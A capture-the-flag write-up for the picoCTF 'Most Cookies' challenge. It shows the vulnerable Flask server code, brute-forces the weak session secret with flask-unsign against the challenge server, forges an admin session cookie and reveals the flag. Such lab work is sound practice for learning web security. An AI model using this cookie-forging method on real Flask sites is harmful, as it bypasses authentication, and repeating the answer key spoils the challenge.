# Most Cookies
## Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/99a50920a248ec37c39b8e3ab0af8789/server.py) http://mercury.picoctf.net:18835/
## Hint
How secure is a flask cookie?
## Solution
- `server.py` contains the following code
```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```
- The site has the text `Welcome to my cookie search page. Now with the best security!` with a text box to enter a cookie name and a search button
- Entering a random cookie name and clicking on the search button will display the text `That doesn't appear to be a valid cookie.`
- Entering a cookie name from the list of `cookie_names` and clicking on the search button will redirect to the `/display` page and display the flash text `That is a cookie! Not very special though...` with the text `I love [entered cookie] cookies!` where `[entered cookie]` is the cookie name entered in the text box
- There's also a Reset button present.
- I looked up solutions online as I didn't have a lot of knowledge on cookies.
- Right clicking on the page and selecting `Inspect` and then going to the `Application` tab and then selecting `Cookies` on the left side will show the cookies present on the site
- The session cookie was `eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zy4cwg.bCLHMF5teikBJ06yNNt-_Jbaxss` which seemed to be a JWT token
- I decoded the token using [jwt.io](https://jwt.io/) and got the following in the `HEADER:ALGORITHM & TOKEN TYPE` section
```json
{
  "very_auth": "blank"
}
```
- this snippet of the python code in `server.py` suggests that the `very_auth` cookie should be set to `admin` to get the flag
```python
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
```
- but we also need to figure out the secret key to sign the JWT token
- I looked up the `app.secret_key` variable in the code and found that it was set to a random cookie name from the `cookie_names` list
- i came across a tool called `flask-unsign` which can be used to unsign the JWT token
- I installed the tool using `pip3 install flask-unsign`
- ran `flask-unsign -h` to get the help menu
- here's a snippet of what it contained
```
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT] [--wordlist WORDLIST]
                    [--threads THREADS] [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY]
                    [--cookie-name COOKIE_NAME] [-U USER_AGENT] [-q] [-C CHUNK_SIZE] [-v]

Flask Unsign is a penetration testing utility that attempts to uncover a Flask server's secret key by taking a signed session
verifying it against a wordlist of commonly used and publicly known secret keys (sourced from books, GitHub, StackOverflow
and various other sources). To begin, use one of the following arguments: --unsign, --sign, --decode

options:
  -h, --help
       Show this help message and exit

  -d, --decode
       Only decode the sessions's contents and write them to stdout.

  -u, --unsign
       Attempts to crack the session's signature by iterating over a given wordlist with commonly used .

  -s, --sign
       Sign a session with a specified secret key, often used for session manipulation. Requires the '--secret' argument.

  -l, --legacy
       Generate / verify signatures using itsdangerous'es legacy timestamp generator. Note: All installations of flask before
       2018-10-18 use this form of timestamp and all generated signatures will be regarded as expired (meaning you will not
       be able to brute-force the secret key nor forge any sessions).

  -c [COOKIE], --cookie [COOKIE]
       Session cookie string. If you're decoding/cracking a session key thiscan be obtained by manually inspecting an HTTP
       request and extracting the value of the "session" cookie. If you're signing a cookie, this can be any arbitrary Python
       dictionary with data (or other data type, whatever floats your boat, but don't expect the server to understand it). If
       no argument is provided, the program will attempt to read from stdin. Note: When signing data, this will ALWAYS be
       evaluated.

  --secret SECRET, -S SECRET
       Secret key to sign a new session cookie with. Generally obtained by brute-forcing a known session using "--unsign".
       Note: this argument is affected by the "--no-literal-eval" argument.

  --salt SALT
       Custom salt string, this will not be changed in most instances of Flask. But hey, if you need to change it, you can!
       Note: this argument is affected by the "--no-literal-eval" argument.

  --wordlist WORDLIST, -w WORDLIST
       Note: this argument is affected by the "--no-literal-eval" argument.
```
- made the following `wordlist.txt` file from the `cookie_names` list
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
- ran the command `flask-unsign -u --server http://mercury.picoctf.net:18835/ --wordlist wordlist.txt` to get the secret key
```
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zy5C5w.FVbpa6J1z2fo2gE0K8dhvUk-xWk
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```
- ran the command `flask-unsign -s -c "{'very_auth': 'admin'}" -S fortune` to sign the JWT token with the secret key `fortune` and got the following output: `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zy5FXQ.bd7Wts7C9sHMK-Xij-ZQmJ6kEAE`
- set the session cookie to `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zy5FXQ.bd7Wts7C9sHMK-Xij-ZQmJ6kEAE` and refreshed the page.
- got the flag `picoCTF{pwn_4ll_th3_cook1E5_743c20eb}`